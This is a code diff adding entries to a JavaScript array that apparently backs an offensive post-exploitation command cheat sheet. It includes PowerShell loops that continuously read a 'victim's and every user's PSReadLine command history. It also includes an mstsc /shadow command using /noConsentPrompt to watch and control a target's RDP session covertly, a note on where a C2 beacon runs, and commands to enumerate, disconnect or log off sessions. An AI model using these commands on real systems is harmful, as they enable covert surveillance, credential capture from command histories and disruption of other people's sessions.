@@ -1919,6 +1919,66 @@ const COMMANDS = [
     tags: ["ps", "postexploit"],
     accent: "#ff9800"
   },
+  {
+    title: "Watch NEW Commands Only",
+    code: "$last=0; while($true){ $h=Get-Content C:\\\\Users\\\\victim\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\ConsoleHost_history.txt; $new=$h.Count; if($new -gt $last){ Write-Host '=== NEW ===' -Fore Green; $h[$last..($new-1)]; $last=$new }; Start-Sleep 5 }",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Watch All Users History",
+    code: "while($true){ Clear-Host; Get-ChildItem C:\\\\Users\\\\*\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\PowerShell\\\\PSReadLine\\\\*.txt | ForEach-Object { $u=$_.FullName.Split('\\\\')[2]; Write-Host \"=== $u ===\" -Fore Cyan; Get-Content $_ -Tail 5 }; Start-Sleep 10 }",
+    tags: ["ps", "postexploit", "c2"],
+    accent: "#ff6b35"
+  },
+  {
+    title: "Check Current Session ID",
+    code: "qwinsta | findstr '>'",
+    tags: ["cmd", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Session 0 Explained",
+    code: "# Session 0 = services/non-interactive (no desktop)\\n# Your beacon runs here - GUI apps invisible\\n# RDP sessions start at ID 2+",
+    tags: ["ps", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Shadow From Correct Session",
+    code: "# 1. RDP in as attacker (psycho)\\n# 2. Open PS in that RDP window\\n# 3. Run: mstsc /shadow:TARGET_ID /noConsentPrompt /control\\n# Shadow window appears in YOUR RDP session",
+    tags: ["ps", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "List Users with Sessions",
+    code: "query user",
+    tags: ["cmd", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Get Session Details",
+    code: "qwinsta /server:localhost",
+    tags: ["cmd", "recon"],
+    accent: "#00f0ff"
+  },
+  {
+    title: "Logoff User Session",
+    code: "logoff SESSION_ID",
+    tags: ["cmd", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Send Message to Session",
+    code: "msg SESSION_ID 'Your message here'",
+    tags: ["cmd", "postexploit"],
+    accent: "#ff9800"
+  },
+  {
+    title: "Disconnect User (Keep Session)",
+    code: "tsdiscon SESSION_ID",
+    tags: ["cmd", "postexploit"],
+    accent: "#ff9800"
+  },
 ];
 
 const list = document.getElementById('cmdList');
